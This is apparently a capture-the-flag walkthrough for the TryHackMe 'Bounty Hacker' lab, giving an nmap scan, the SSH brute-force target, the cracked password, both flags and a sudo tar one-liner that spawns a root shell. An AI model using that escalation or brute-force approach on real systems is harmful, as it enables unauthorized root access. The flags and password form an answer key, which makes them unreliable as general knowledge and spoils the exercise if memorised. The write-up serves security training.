# Bounty Hacker

## Task 1 Living up to the title.

### Deploy the machine.

{% hint style="success" %}
No answer needed
{% endhint %}

### Find open ports on the machine

```
nmap -sC -sV -T5 -p1-65535 10.10.40.31
```

![](<../.gitbook/assets/image (308).png>)

{% hint style="success" %}
No answer needed
{% endhint %}

### Who wrote the task list?

![](<../.gitbook/assets/image (306).png>)

![](<../.gitbook/assets/image (307).png>)

{% hint style="success" %}
lin
{% endhint %}

### What service can you bruteforce with the text file found?

{% hint style="success" %}
ssh
{% endhint %}

### What is the users password?

![](<../.gitbook/assets/image (309).png>)

{% hint style="success" %}
RedDr4gonSynd1cat3
{% endhint %}

### user.txt

![](<../.gitbook/assets/image (311).png>)

{% hint style="success" %}
THM{CR1M3\_SyNd1C4T3}
{% endhint %}

### root.txt

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![](<../.gitbook/assets/image (313).png>)

{% embed url="https://gtfobins.github.io/gtfobins/tar/" %}

{% hint style="success" %}
THM{80UN7Y\_h4cK3r}
{% endhint %}
